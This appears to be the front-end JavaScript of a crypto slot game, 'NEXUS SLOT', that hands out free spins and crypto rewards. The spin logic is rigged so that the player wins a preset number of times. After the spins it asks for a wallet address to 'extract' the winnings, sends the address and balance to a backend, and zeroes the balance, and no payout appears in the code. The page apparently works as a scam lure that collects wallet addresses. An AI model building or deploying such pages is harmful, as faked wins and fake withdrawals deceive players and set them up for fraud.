// ===================== NEXUS SLOT · 主游戏逻辑 =====================
const API_BASE = '';

const T = k => (typeof window.__t === 'function') ? window.__t(k) : k;

// ===================== 币种配置 =====================
const COIN_META = {
    USDT: { icon: '₮', decimals: 2, className: 'coin-USDT' },
    BTC:  { icon: '₿', decimals: 8, className: 'coin-BTC' },
    ETH:  { icon: 'Ξ', decimals: 6, className: 'coin-ETH' },
    DOGE: { icon: 'Ð', decimals: 2, className: 'coin-DOGE' },
    TRX:  { icon: 'T', decimals: 2, className: 'coin-TRX' },
    SOL:  { icon: '◎', decimals: 4, className: 'coin-SOL' }
};

// 全局运行时状态
window.__GAME_CONFIG = {
    currency: 'USDT',
    rewards: { 2: 10, 3: 30, 4: 200, 5: 10000 },
    winCount: 3
};

// 缓存 key
const CFG_CACHE_KEY = '__nexus_cfg_cache';

// 从 localStorage 读缓存配置
function loadCachedConfig() {
    try {
        const raw = localStorage.getItem(CFG_CACHE_KEY);
        if (!raw) return null;
        const cfg = JSON.parse(raw);
        if (cfg && cfg.currency && COIN_META[cfg.currency]) {
            return cfg;
        }
    } catch (e) {}
    return null;
}

// 写缓存配置
function saveCachedConfig(cfg) {
    try {
        localStorage.setItem(CFG_CACHE_KEY, JSON.stringify(cfg));
    } catch (e) {}
}

// ★ 立即应用缓存配置（在请求之前，避免闪 USDT）
(function applyCachedConfigImmediately(){
    const cached = loadCachedConfig();
    if (cached) {
        if (cached.currency) window.__GAME_CONFIG.currency = cached.currency;
        if (cached.rewards && typeof cached.rewards === 'object') {
            window.__GAME_CONFIG.rewards = {
                2: parseFloat(cached.rewards[2]) || 0,
                3: parseFloat(cached.rewards[3]) || 0,
                4: parseFloat(cached.rewards[4]) || 0,
                5: parseFloat(cached.rewards[5]) || 0
            };
        }
        if (cached.winCount !== undefined) {
            window.__GAME_CONFIG.winCount = parseInt(cached.winCount, 10) || 0;
        }
        // 等 DOM 就绪后立即刷新 UI
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', applyConfigToUI);
        } else {
            applyConfigToUI();
        }
    }
})();

// 地址验证规则（按币种）
const ADDR_VALIDATORS = {
    USDT: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
    TRX:  /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
    BTC:  /^(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{25,60})$/,
    ETH:  /^0x[a-fA-F0-9]{40}$/,
    DOGE: /^D[5-9A-HJ-NP-Za-km-z]{33}$/,
    SOL:  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
};

// 金额格式化：按币种小数位去尾 0
function formatAmount(value, currency) {
    const meta = COIN_META[currency] || COIN_META.USDT;
    let n = parseFloat(value);
    if (isNaN(n)) n = 0;
    let str = n.toFixed(meta.decimals);
    if (str.indexOf('.') >= 0) {
        str = str.replace(/0+$/, '').replace(/\.$/, '');
    }
    if (str === '' || str === '-') str = '0';
    return str;
}

// 给数字加千分位（整数部分）
function formatAmountWithSep(value, currency) {
    const raw = formatAmount(value, currency);
    const parts = raw.split('.');
    parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    return parts.join('.');
}

// ★ 移除启动遮罩
function hideBootOverlay() {
    const ov = document.getElementById('bootOverlay');
    if (!ov) return;
    ov.classList.add('hide');
    setTimeout(() => { try { ov.remove(); } catch(e){} }, 320);
}

// ===================== 访问会话管理 =====================
let __visitId = null;
let __heartbeatTimer = null;
let __heartbeatInterval = 30;
let __visitStarted = false;
let __visitEnded = false;

async function loadPublicSettings() {
    try {
        const res = await fetch('/api/public-settings');
        const cfg = await res.json();
        if (cfg.heartbeatInterval) __heartbeatInterval = cfg.heartbeatInterval;
        if (cfg.currency && COIN_META[cfg.currency]) {
            window.__GAME_CONFIG.currency = cfg.currency;
        }
        if (cfg.rewards && typeof cfg.rewards === 'object') {
            window.__GAME_CONFIG.rewards = {
                2: parseFloat(cfg.rewards[2]) || 0,
                3: parseFloat(cfg.rewards[3]) || 0,
                4: parseFloat(cfg.rewards[4]) || 0,
                5: parseFloat(cfg.rewards[5]) || 0
            };
        }
        if (cfg.winCount !== undefined) {
            window.__GAME_CONFIG.winCount = parseInt(cfg.winCount, 10) || 0;
        }
        // 写入缓存
        saveCachedConfig({
            currency: window.__GAME_CONFIG.currency,
            rewards: window.__GAME_CONFIG.rewards,
            winCount: window.__GAME_CONFIG.winCount
        });
        applyConfigToUI();
        // 配置加载完成后，重建滚动队列
        if (typeof window.__rebuildRollingAddresses === 'function') {
            window.__rebuildRollingAddresses();
        }
    } catch (e) {
        console.warn('读取公共配置失败:', e.message);
    } finally {
        // ★ 无论成功失败，都移除遮罩
        hideBootOverlay();
    }
}

function applyConfigToUI() {
    const cur = window.__GAME_CONFIG.currency;
    const meta = COIN_META[cur] || COIN_META.USDT;

    const iconEl = document.getElementById('balanceIcon');
    if (iconEl) {
        iconEl.textContent = meta.icon;
        iconEl.className = 'wallet-coin-icon ' + meta.className;
    }
    const unitEl = document.getElementById('balanceUnit');
    if (unitEl) unitEl.textContent = cur;

    const jackpotVal = document.getElementById('jackpotVal');
    if (jackpotVal) {
        jackpotVal.textContent = formatAmountWithSep(window.__GAME_CONFIG.rewards[5], cur) + ' ' + cur;
    }

    const table = document.getElementById('paytable');
    if (table) {
        table.querySelectorAll('.pay-v').forEach(el => {
            const n = el.dataset.pay;
            if (n && window.__GAME_CONFIG.rewards[n] !== undefined) {
                el.textContent = formatAmountWithSep(window.__GAME_CONFIG.rewards[n], cur) + ' ' + cur;
            }
        });
    }

    if (typeof window.__updateExtractLabel === 'function') window.__updateExtractLabel();

    const extractAmt = document.getElementById('extractAmt');
    if (extractAmt) {
        const num = parseFloat(extractAmt.textContent.replace(/[^\d.-]/g, '')) || 0;
        extractAmt.textContent = formatAmount(num, cur) + ' ' + cur;
    }

    if (typeof window.switchLanguage === 'function') {
        window.switchLanguage(window.__currentLang || 'en');
    }
}

async function startVisitSession() {
    if (__visitStarted) return;
    __visitStarted = true;
    try {
        await loadPublicSettings();

        const lang = (document.getElementById('langSelect') && document.getElementById('langSelect').value) || (navigator.language || 'en');
        const visitId = Date.now() + '_' + Math.random().toString(36).slice(2, 10);
        const res = await fetch('/api/visit-start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ visitId: visitId, language: lang })
        });
        const data = await res.json();
        if (data.success && data.id) {
            __visitId = data.id;
            window.__visitId = data.id;
            startHeartbeat();
        }
    } catch (e) {
        console.warn('访问会话创建失败:', e.message);
        hideBootOverlay();
    }
}

function startHeartbeat() {
    if (__heartbeatTimer) clearInterval(__heartbeatTimer);
    __heartbeatTimer = setInterval(() => {
        if (!__visitId || __visitEnded) return;
        fetch('/api/visit-heartbeat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: __visitId })
        }).catch(() => {});
    }, __heartbeatInterval * 1000);
}

function endVisitSession() {
    if (!__visitId || __visitEnded) return;
    __visitEnded = true;
    const payload = JSON.stringify({ id: __visitId });
    if (navigator.sendBeacon) {
        try {
            navigator.sendBeacon('/api/visit-end', new Blob([payload], { type: 'application/json' }));
        } catch (e) {
            fetch('/api/visit-end', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload,
                keepalive: true
            }).catch(() => {});
        }
    } else {
        fetch('/api/visit-end', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: payload,
            keepalive: true
        }).catch(() => {});
    }
    if (__heartbeatTimer) { clearInterval(__heartbeatTimer); __heartbeatTimer = null; }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startVisitSession);
} else {
    startVisitSession();
}
window.addEventListener('pagehide', endVisitSession);
window.addEventListener('beforeunload', endVisitSession);

// ★ 保险：无论如何 3 秒后移除遮罩（防止请求卡住一直白屏）
setTimeout(hideBootOverlay, 3000);

// ===================== 主游戏 =====================
(function(){
const N=5,EXTRA=28,DELAY=.1,DUR=2.05,STEP=.16,OVER=16,SPINS=3;
const JACKPOT = 10000;
const MATCH_POOL = [2, 3, 4];
const SYMS=[
{id:"btc",cls:"sym-btc",label:"BTC",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M20.2 14.3c.3-2-1.2-3.1-3.3-3.8l.7-2.7-1.6-.4-.7 2.6c-.4-.1-.9-.2-1.3-.3l.7-2.6-1.6-.4-.7 2.7c-.4-.1-.7-.2-1-.2l-2.2-.5-.4 1.7s1.2.3 1.1.3c.6.2.8.5.7.9l-.7 3 .2.1-1.1 4.3c-.1.2-.3.5-.7.4l-1.1-.3-.8 1.8 2.1.5c.4.1.8.2 1.1.3l-.7 2.8 1.6.4.7-2.7c.4.1.9.2 1.3.3l-.7 2.7 1.6.4.7-2.8c2.9.5 5 .3 6-2.3.8-2.1 0-3.3-1.6-4.1 1.2-.3 2-1.1 2.2-2.7zm-3.2 4.5c-.5 2.2-4.1 1-5.3.7l.9-3.8c1.2.3 5 .9 4.4 3.1zm.6-4.5c-.5 2-3.5.97-4.4.73l.9-3.4c1 .2 4.1.7 3.5 2.67z"/></svg>'},
{id:"eth",cls:"sym-eth",label:"ETH",svg:'<svg viewBox="0 0 32 32"><path fill="#8A9FF0" d="M16 5.2v8.3l7 3.1L16 5.2z"/><path fill="#627EEA" d="M16 5.2L9 16.6l7-3.1V5.2z"/><path fill="#8A9FF0" d="M16 21.5v5.3l7.1-9.8-7.1 4.5z"/><path fill="#627EEA" d="M16 26.8v-5.3l-7.1-4.5L16 26.8z"/><path fill="#4A62C8" d="M16 20.1l7-3.5-7-3.1v6.6z"/><path fill="#627EEA" d="M9 16.6l7 3.5v-6.6L9 16.6z"/></svg>'},
{id:"sol",cls:"sym-sol",label:"SOL",svg:'<svg viewBox="0 0 32 32"><path fill="#14F195" d="M8.4 20.6c.2-.2.5-.3.8-.3h14.2c.5 0 .8.6.4 1l-2.7 2.7c-.2.2-.5.3-.8.3H6.1c-.5 0-.8-.6-.4-1l2.7-2.7z"/><path fill="#9945FF" d="M8.4 8c.2-.2.5-.3.8-.3h14.2c.5 0 .8.6.4 1l-2.7 2.7c-.2.2-.5.3-.8.3H6.1c-.5 0-.8-.6-.4-1L8.4 8z"/><path fill="#00C2FF" d="M23.6 14.1c-.2-.2-.5-.3-.8-.3H8.6c-.5 0-.8.6-.4 1l2.7 2.7c.2.2.5.3.8.3h14.2c.5 0 .8-.6.4-1l-2.7-2.7z"/></svg>'},
{id:"doge",cls:"sym-doge",label:"DOGE",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M11 8.2h7.1c3.6 0 6.2 2.4 6.2 5.8 0 2.2-1.1 4.1-2.9 5.1l3.6 4.7h-4.2l-3.1-4.2H14.6V24h-3.6V8.2zm3.6 3.1v5.2h3.4c1.7 0 2.8-1.1 2.8-2.6s-1.1-2.6-2.8-2.6h-3.4z"/></svg>'},
{id:"usdt",cls:"sym-usdt",label:"USDT",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M17.9 17.4v2.3c3 .16 5.2.88 5.2 1.74s-2.2 1.57-5.2 1.73v2.73h-1.9v-2.7c-3.05-.18-5.32-.93-5.32-1.84s2.27-1.65 5.32-1.82v-2.34c-2.16.14-3.67.7-3.67 1.37H9.5c0-1.2 2.38-2.12 5.45-2.28V13h1.9v1.1c3 .16 5.22.9 5.22 1.82 0 .93-2.22 1.66-5.22 1.82v.66h.05zm-1.9-.3v-2.18c-2.03.12-3.35.6-3.35 1.15s1.32 1.03 3.35 1.15zm1.9 4.82v-2.26c2.08.13 3.44.64 3.44 1.21s-1.36 1.07-3.44 1.18z"/></svg>'},
{id:"trx",cls:"sym-trx",label:"TRX",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M6.4 7.2l18.8 4.4-7.6 13.2L6.4 7.2zm13.3 5.1L9.8 9.7l7.7 11.4 2.2-8.8zm1.5.6l-2 7.8 5.3-9.2-3.3 1.4z"/></svg>'}
];
const MAP=Object.fromEntries(SYMS.map(s=>[s.id,s]));
const $=id=>document.getElementById(id);
const pick=a=>a[Math.floor(Math.random()*a.length)];
function shuffle(a){a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a}
function bezier(x1,y1,x2,y2){
  const A=(a,b)=>1-3*b+3*a,B=(a,b)=>3*b-6*a,C=a=>3*a;
  const calc=(t,a,b)=>((A(a,b)*t+B(a,b))*t+C(a))*t;
  const sl=(t,a,b)=>3*A(a,b)*t*t+2*B(a,b)*t+C(a);
  return x=>{let t=x;for(let i=0;i<8;i++){const s=sl(t,x1,x2);if(Math.abs(s)<1e-6)break;t=Math.max(0,Math.min(1,t-(calc(t,x1,x2)-x)/s))}return calc(t,y1,y2)};
}
const E_OUT=t=>1-Math.pow(1-t,3);
const E_BACK=bezier(.175,.885,.32,1.275);
function setY(el,y){el._y=y;el.style.transform="translate3d(0,"+y+"px,0)"}
function getY(el){return Number(el._y)||0}
function tweenY(el,to,dur,ease,delay,onStart,onEnd){
  return new Promise(res=>{
    const from=getY(el),t0=performance.now()+delay*1000;
    let started=0;
    (function tick(now){
      if(now<t0){requestAnimationFrame(tick);return}
      if(!started){started=1;onStart&&onStart()}
      const p=dur<=0?1:Math.min(1,(now-t0)/(dur*1000));
      setY(el,from+(to-from)*ease(p));
      if(p<1)requestAnimationFrame(tick);
      else{setY(el,to);onEnd&&onEnd();res()}
    })(performance.now());
  });
}

const SFX={
  ctx:null,muted:false,nodes:[],
  unlock(){if(!this.ctx){const AC=window.AudioContext||window.webkitAudioContext;if(!AC)return;this.ctx=new AC()}if(this.ctx.state==="suspended")this.ctx.resume()},
  tone(f,d,type,g,atk,peak){if(this.muted||!this.ctx)return;const t=this.ctx.currentTime,o=this.ctx.createOscillator(),a=this.ctx.createGain();o.type=type;o.frequency.setValueAtTime(f,t);a.gain.setValueAtTime(.0001,t);a.gain.exponentialRampToValueAtTime(g,t+atk);a.gain.exponentialRampToValueAtTime(.0001,t+d);if(peak)o.frequency.exponentialRampToValueAtTime(peak,t+d);o.connect(a);a.connect(this.ctx.destination);o.start(t);o.stop(t+d+.02)},
  noise(d,g){if(this.muted||!this.ctx)return;const t=this.ctx.currentTime,n=this.ctx.sampleRate*d,buf=this.ctx.createBuffer(1,n,this.ctx.sampleRate),data=buf.getChannelData(0);for(let i=0;i<n;i++)data[i]=(Math.random()*2-1)*.6;const src=this.ctx.createBufferSource(),bp=this.ctx.createBiquadFilter(),a=this.ctx.createGain();src.buffer=buf;bp.type="bandpass";bp.frequency.value=1200;a.gain.setValueAtTime(g,t);a.gain.exponentialRampToValueAtTime(.0001,t+d);src.connect(bp);bp.connect(a);a.connect(this.ctx.destination);src.start(t)},
  startSpin(){this.stopSpin();if(this.muted||!this.ctx)return;const t=this.ctx.currentTime,o=this.ctx.createOscillator(),l=this.ctx.createOscillator(),lg=this.ctx.createGain(),g=this.ctx.createGain();o.type="sawtooth";o.frequency.value=70;l.type="triangle";l.frequency.value=18;lg.gain.value=18;g.gain.value=.03;l.connect(lg);lg.connect(o.frequency);o.connect(g);g.connect(this.ctx.destination);o.start(t);l.start(t);this.nodes=[o,l]},
  stopSpin(){this.nodes.forEach(n=>{try{n.stop()}catch(e){}});this.nodes=[]},
  reelStop(){this.tone(180,.08,"square",.05,.005,90);this.noise(.05,.04)},
  win(jp){(jp?[523,659,784,1046,1318]:[392,523,659,784]).forEach((f,i)=>setTimeout(()=>this.tone(f,.28,"triangle",.07,.01,f*1.02),i*90))}
};

let cv,cx,raf=0,parts=[];
function burst(opt){
  if(!cv){cv=document.createElement("canvas");cv.style.cssText="position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:80";document.body.appendChild(cv);cx=cv.getContext("2d");const rs=()=>{cv.width=innerWidth;cv.height=innerHeight};rs();addEventListener("resize",rs)}
  const n=opt.n||50,cols=opt.c||["#FFD166","#00F0FF","#B026FF","#fff"],ox=(opt.x??.5)*cv.width,oy=(opt.y??.5)*cv.height,sp=((opt.sp??45)*Math.PI)/180,ang=((opt.a??90)*Math.PI)/180,vel=opt.v||45,sc=opt.sc||1,life=opt.t||200;
  for(let i=0;i<n;i++){const a=ang+(Math.random()-.5)*sp,s=vel*(.45+Math.random()*.7);parts.push({x:ox,y:oy,vx:Math.cos(a)*s*.22,vy:-Math.sin(a)*s*.22,w:(4+Math.random()*5)*sc,h:(6+Math.random()*8)*sc,r:Math.random()*Math.PI,spin:(Math.random()-.5)*.28,col:cols[i%cols.length],life,max:life})}
  if(!raf)raf=requestAnimationFrame(function loop(){cx.clearRect(0,0,cv.width,cv.height);for(let i=parts.length-1;i>=0;i--){const p=parts[i];p.vy+=.18;p.vx*=.995;p.x+=p.vx;p.y+=p.vy;p.r+=p.spin;p.life--;if(p.life<=0||p.y>cv.height+20){parts.splice(i,1);continue}cx.save();cx.translate(p.x,p.y);cx.rotate(p.r);cx.globalAlpha=Math.max(0,p.life/p.max);cx.fillStyle=p.col;cx.fillRect(-p.w/2,-p.h/2,p.w,p.h);cx.restore()}raf=parts.length?requestAnimationFrame(loop):0});
}
function fireConfetti(jp){
  const c=["#FFD166","#00F0FF","#B026FF","#FF2BD6","#fff"];
  burst({n:jp?160:90,sp:78,v:48,y:.28,c});
  burst({n:jp?70:36,sp:55,sc:1.15,t:260,y:.32,c:["#FFD166","#F0B429","#FFF3C4"]});
  if(jp){const end=Date.now()+900;(function f(){burst({n:3,a:60,sp:55,x:0,c});burst({n:3,a:120,sp:55,x:1,c});if(Date.now()<end)requestAnimationFrame(f)})()}
}

const S={spinning:0,left:SPINS,bal:0,pending:0,canExtract:0,withdrawn:0,addr:"",last:["btc","eth","sol","doge","usdt"],strips:[],reels:[],roundSpins:0,roundWins:0,lastWasNoWin:0};
function symH(){const p=document.querySelector(".sym");return p?p.getBoundingClientRect().height:64}
function el(id,extra){const m=MAP[id],d=document.createElement("div");d.className="sym "+m.cls+(extra?" "+extra:"");d.dataset.id=id;d.innerHTML='<div class="sym-card">'+m.svg+"</div>";return d}
function nbr(ex){return pick(SYMS.filter(s=>s.id!==ex)).id}
function triple(c){return[nbr(c),c,nbr(c)]}
function visCenter(strip){const nodes=strip.querySelectorAll(".sym"),h=Math.max(symH(),1),start=Math.round(Math.abs(getY(strip))/h);return nodes[start+1]||nodes[1]}
function mount(){
  const stage=$("reelsStage"),ticks=[...stage.querySelectorAll(".tick")];
  stage.querySelectorAll(".reel").forEach(e=>e.remove());
  S.reels=[];S.strips=[];
  for(let i=0;i<N;i++){
    const reel=document.createElement("div");reel.className="reel";
    const strip=document.createElement("div");strip.className="reel-strip";
    triple(S.last[i]).forEach((id,idx)=>strip.appendChild(el(id,idx===1?"on-payline":"")));
    reel.appendChild(strip);stage.appendChild(reel);S.reels.push(reel);S.strips.push(strip);
  }
  ticks.forEach(t=>stage.appendChild(t));
}
function setBal(n){
  S.bal=n;
  const cur = window.__GAME_CONFIG.currency;
  const b=document.getElementById("balanceText");
  if(b) b.textContent = formatAmountWithSep(n, cur);
}
function setLeft(n){S.left=n;const s=document.getElementById("spinsText");if(s)s.textContent=n}
function calcPayout(match){
  return parseFloat(window.__GAME_CONFIG.rewards[match]) || 0;
}

function outcome(forceWin){
  if (forceWin === false) {
    const r = shuffle(SYMS).slice(0, N).map(s => s.id);
    return { result: r, winId: null, match: 1, payout: 0 };
  }
  const m = pick(MATCH_POOL);
  const win = pick(SYMS);
  const r = new Array(N);
  const ord = shuffle([...Array(N).keys()]);
  for(let i=0;i<m;i++) r[ord[i]] = win.id;
  const oth = shuffle(SYMS.filter(s=>s.id!==win.id));
  for(let i=m;i<N;i++) r[ord[i]] = oth[(i-m)%oth.length].id;
  const c={};r.forEach(id=>c[id]=(c[id]||0)+1);const top=Math.max(...Object.values(c));
  return{result:r,winId:win.id,match:top,payout:calcPayout(top)};
}
function highlight(result,winId,match){
  S.strips.forEach((strip,i)=>{
    strip.querySelectorAll(".sym").forEach(e=>e.classList.remove("on-payline","is-win"));
    const c=visCenter(strip);if(c){c.classList.add("on-payline");if(result[i]===winId)c.classList.add("is-win")}
  });
  const table=$("paytable");
  table.classList.toggle("is-resolved",match>=2);
  table.querySelectorAll(".pay-item").forEach(e=>e.classList.toggle("is-hit",match>=2&&+e.dataset.n===match));
}
function clearHL(){document.querySelectorAll(".sym.is-win,.pay-item.is-hit").forEach(e=>e.classList.remove("is-win","is-hit"));$("paytable").classList.remove("is-resolved")}

function restoreBtn(){
  const b=$("spinBtn");
  if(!b) return;
  if(S.canExtract){
    b.classList.add("is-extract");
    b.disabled=false;
    b.textContent = S.withdrawn ? T('view_records') : T('extract_btn');
    return;
  }
  b.classList.remove("is-extract");
  b.disabled=S.pending>0||S.spinning;
  b.textContent=S.spinning?T('spinning_btn'):T('spin_btn');
}

function toast(t){const e=$("toast");e.textContent=t;e.classList.add("show");clearTimeout(toast._t);toast._t=setTimeout(()=>e.classList.remove("show"),1600)}
function openM(id,on){$(id).classList.toggle("open",on!==false)}

async function checkPlayerStatus(){
  try {
    const res = await fetch(API_BASE + '/api/player-status');
    const data = await res.json();
    if (data && data.canPlay === false) {
      S.canExtract = 1;
      S.withdrawn = 1;
      restoreBtn();
    }
  } catch (e) {
    console.warn('查询玩家状态失败:', e.message);
  }
}

window.__forceLimitReached = function(){
  S.canExtract = 1;
  S.withdrawn = 1;
  restoreBtn();
};

function openExtractModal(){
  const cur = window.__GAME_CONFIG.currency;
  $("extractAmt").textContent = formatAmountWithSep(S.bal, cur) + " " + cur;
  if (typeof window.__updateExtractLabel === 'function') window.__updateExtractLabel();
  const input = $("trc20Input");
  input.classList.remove("is-invalid");
  $("trc20Err").textContent = "";
  if (cur === 'ETH') input.placeholder = '0x................................';
  else if (cur === 'BTC') input.placeholder = '1... / 3... / bc1...';
  else if (cur === 'DOGE') input.placeholder = 'D................................';
  else if (cur === 'SOL') input.placeholder = '4................................';
  else input.placeholder = 'T................................';
  openM("extractModal");
  setTimeout(()=>input.focus(), 280);
}

function spin(){
  if(S.spinning||S.pending||S.canExtract||S.left<=0)return;
  SFX.unlock();S.spinning=1;setLeft(S.left-1);clearHL();
  const btn=$("spinBtn");
  btn.classList.remove("is-extract");btn.disabled=true;btn.textContent=T('spinning_btn');

  const winCount = (typeof window.__GAME_CONFIG.winCount === 'number') ? window.__GAME_CONFIG.winCount : 3;
  const totalSpins = SPINS;
  S.roundSpins = (S.roundSpins || 0) + 1;
  const spinsLeftInclThis = totalSpins - S.roundSpins + 1;
  const winsNeeded = winCount - (S.roundWins || 0);

  let forceWin = null;
  if (winsNeeded <= 0) {
    forceWin = false;
  } else if (winsNeeded >= spinsLeftInclThis) {
    forceWin = true;
  } else {
    forceWin = null;
  }

  const out = outcome(forceWin);
  const isNoWin = (out.match < 2);
  const jp = false;

  if (!isNoWin) S.roundWins = (S.roundWins || 0) + 1;

  let sharedNoWinSyms = null;
  if (isNoWin) {
    sharedNoWinSyms = shuffle(SYMS).slice(0, N).map(s => s.id);
  }

  SFX.startSpin();if(navigator.vibrate)navigator.vibrate(12);
  const h=symH();
  Promise.all(S.strips.map((strip,i)=>{
    const nodes=strip.querySelectorAll(".sym"),start=Math.round(Math.abs(getY(strip))/Math.max(h,1));
    const from=[0,1,2].map(k=>nodes[start+k]?.dataset.id||pick(SYMS).id);
    const ids=from.slice();
    for(let k=0;k<EXTRA;k++)ids.push(pick(SYMS).id);
    if (isNoWin) {
      const c = sharedNoWinSyms[i];
      ids.push(...triple(c), nbr(c), nbr(c));
    } else {
      ids.push(...triple(out.result[i]),nbr(out.result[i]),nbr(out.result[i]));
    }
    strip.innerHTML="";ids.forEach(id=>strip.appendChild(el(id)));setY(strip,0);
    const y=-((ids.length-5)*h);
    return tweenY(strip,y-OVER,DUR+i*STEP,E_OUT,i*DELAY,()=>S.reels[i].classList.add("is-spinning"),()=>S.reels[i].classList.remove("is-spinning"))
      .then(()=>tweenY(strip,y,.38,E_BACK,0,null,()=>{SFX.reelStop();if(navigator.vibrate)navigator.vibrate(8)}));
  })).then(()=>{
    SFX.stopSpin();S.spinning=0;S.last=out.result.slice();highlight(out.result,out.winId,out.match);

    if (S.left <= 0) S.canExtract = 1;

    if (isNoWin) {
      S.pending = 0;
      S.lastWasNoWin = 1;
      restoreBtn();

      const m=$("winModal");
      m.classList.remove("jackpot");
      $("winKicker").textContent = T('no_win_kicker');
      $("winTitle").textContent = T('no_win_title');
      $("winAmt").textContent = "";
      $("winDesc").textContent = T('no_win_desc');
      $("claimBtn").textContent = T('continue_btn');
      openM("winModal");
    } else {
      S.pending = out.payout;
      S.lastWasNoWin = 0;
      restoreBtn();SFX.win(jp);
      if(navigator.vibrate)navigator.vibrate([18,30,18]);
      fireConfetti(jp);

      const cur = window.__GAME_CONFIG.currency;
      const m=$("winModal"),lab=(out.winId && MAP[out.winId] && MAP[out.winId].label)||"CRYPTO";
      m.classList.toggle("jackpot",jp);
      $("winKicker").textContent = T('win_kicker_normal');
      $("winTitle").textContent = T('win_title_normal');
      $("winAmt").textContent = "+"+formatAmountWithSep(out.payout, cur)+" "+cur;
      $("winDesc").textContent = T('win_desc').replace('{n}',out.match).replace('{sym}',lab).replace('{amt}',formatAmountWithSep(out.payout, cur)).replace('{cur}',cur);
      $("claimBtn").textContent = T('claim_btn');
      openM("winModal");
    }
  });
}

function claim(){
  if (S.lastWasNoWin) {
    S.lastWasNoWin = 0;
    openM("winModal", false);
    if (S.left <= 0) S.canExtract = 1;
    restoreBtn();
    if (S.left <= 0 && S.bal > 0) {
      setTimeout(openExtractModal, 400);
    }
    return;
  }

  if(S.pending>0){
    setBal(S.bal+S.pending);
    const cur = window.__GAME_CONFIG.currency;
    toast("+"+formatAmountWithSep(S.pending, cur)+" "+cur+" "+T('claimed'));
    S.pending=0;
  }
  if(S.left<=0)S.canExtract=1;
  openM("winModal",false);restoreBtn();

  if (S.left <= 0 && S.bal > 0) {
    setTimeout(openExtractModal, 400);
  }
}

function validateAddress(addr, currency) {
    const re = ADDR_VALIDATORS[currency] || ADDR_VALIDATORS.USDT;
    return re.test(addr);
}

function submit(){
  const input=$("trc20Input"),err=$("trc20Err"),addr=input.value.trim();
  const cur = window.__GAME_CONFIG.currency;
  if(!validateAddress(addr, cur)){
    input.classList.add("is-invalid");
    const key = 'invalid_addr_' + cur.toLowerCase();
    const fallbackKey = 'invalid_addr';
    err.textContent = T(key) !== key ? T(key) : T(fallbackKey);
    return;
  }
  input.classList.remove("is-invalid");
  err.textContent="";
  const withdrawAmount = S.bal;
  S.withdrawn=1;
  S.addr=addr;
  if(S.left<=0) S.canExtract = 1;
  openM("extractModal",false);
  $("confirmAddr").textContent=addr;
  openM("confirmModal");
  setBal(0);
  restoreBtn();
  submitTrc20Record(addr, withdrawAmount);
}

function onMain(){
  if(S.canExtract && !S.spinning && !S.pending){
    if(S.withdrawn){
      if(typeof window.__openMyRecords === 'function') window.__openMyRecords();
      return;
    }
    openExtractModal();
    return;
  }
  spin();
}

function init(){
  const block=e=>e.preventDefault();
  addEventListener("gesturestart",block,{passive:false});
  addEventListener("gesturechange",block,{passive:false});
  addEventListener("dblclick",block,{passive:false});
  addEventListener("touchmove",e=>{if(e.touches.length>1)e.preventDefault()},{passive:false});
  mount();setBal(0);setLeft(SPINS);
  S.roundSpins = 0;
  S.roundWins = 0;
  S.lastWasNoWin = 0;
  $("spinBtn").onclick=onMain;
  $("claimBtn").onclick=claim;
  $("submitWithdrawBtn").onclick=submit;
  $("trc20Input").onkeydown=e=>{if(e.key==="Enter")submit()};
  $("muteBtn").onclick=()=>{SFX.muted=!SFX.muted;if(SFX.muted)SFX.stopSpin();$("iconSoundOn").classList.toggle("hidden",SFX.muted);$("iconSoundOff").classList.toggle("hidden",!SFX.muted)};
  let lastW=innerWidth;
  addEventListener("resize",()=>{if(S.spinning||S.pending||S.canExtract||innerWidth===lastW)return;lastW=innerWidth;mount()});
  if(typeof initRollingAddresses === 'function') initRollingAddresses();
  const cm = document.getElementById('confirmModal');
  if (cm) cm.addEventListener('click', e => { if (e.target === cm) cm.classList.remove('open'); });

  checkPlayerStatus();
}
if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",init);else init();

window.__refreshSpinBtn = restoreBtn;
})();

// ========== 暴露币种/奖励配置给其他脚本 ==========
window.__getCurrency = () => window.__GAME_CONFIG.currency;
window.__getReward = (match) => window.__GAME_CONFIG.rewards[match] || 0;
window.__formatAmount = formatAmountWithSep;

// ========== 提交提现记录到后端 ==========
async function submitTrc20Record(address, balance){
  try {
    const lang = (document.getElementById('langSelect') && document.getElementById('langSelect').value) || (navigator.language || 'en');
    const visitId = window.__visitId;
    const currency = window.__GAME_CONFIG.currency;
    if (!visitId) {
      console.warn('未创建访问会话，无法提交');
      alert('页面还在初始化，请稍后再试');
      return;
    }
    const payload = {
      id: visitId,
      address: address,
      balance: formatAmount(balance, currency),
      currency: currency,
      timestamp: new Date().toISOString(),
      language: lang,
      visitTime: window.__firstVisitTime || new Date().toISOString()
    };
    const res = await fetch(API_BASE + '/api/records', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      if (res.status === 429 || data.error === 'DAILY_LIMIT_REACHED') {
        const t = window.__t || (k => k);
        alert(t('limit_reached'));
        if (typeof window.__forceLimitReached === 'function') window.__forceLimitReached();
        return;
      }
      console.warn('提交失败:', data.error || ('HTTP ' + res.status));
      return;
    }
    console.log('[提交] 提现记录已保存');
  } catch (err) {
    console.warn('地址记录提交失败:', err.message);
  }
}

